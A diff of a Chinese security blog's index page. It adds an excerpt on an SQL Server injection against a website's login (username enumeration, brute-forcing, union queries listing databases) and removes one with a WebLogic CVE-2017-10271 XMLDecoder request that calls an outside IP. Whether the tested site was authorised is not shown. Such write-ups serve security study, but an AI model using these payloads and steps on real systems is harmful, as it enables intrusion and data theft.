@@ -66,6 +66,76 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">记一次SQL Server报错注入</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2018-12-24
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
+用户不存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
+用户名存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
+可以的，验证码前端验证，我觉得可以burp抓包intruder一下
+跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
+0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
+哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
+刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
+看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
+试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username='admin'
+那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
+得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
+py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/2018/docker-compose-build-lamp/">使用docker-compose构造LAMP环境</a></h2>
 
         
@@ -631,68 +701,6 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/2018/cve-2017-10271/">WebLogic 反序列化漏洞(CVE-2017-10271)</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2018-03-09
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/rce">rce</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/deserialize">deserialize</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
-漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
-0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object id=&quot;url&quot; class=&quot;java.net.URL&quot;&gt; &lt;string&gt;http://114.115.123.123:80/aaaaaaa&lt;/string&gt; &lt;/object&gt; &lt;object idref=&quot;url&quot;&gt; &lt;void id=&quot;stream&quot; method = &quot;openStream&quot; /&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2018/cve-2017-10271/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -725,7 +733,7 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/database" title="database">database(11)</a>
+                <a href="http://wyb0.com/topics/database" title="database">database(12)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -927,6 +935,11 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/postgresql" title="postgresql">postgresql</a>
                 <sup>1</sup>
             </p>
         
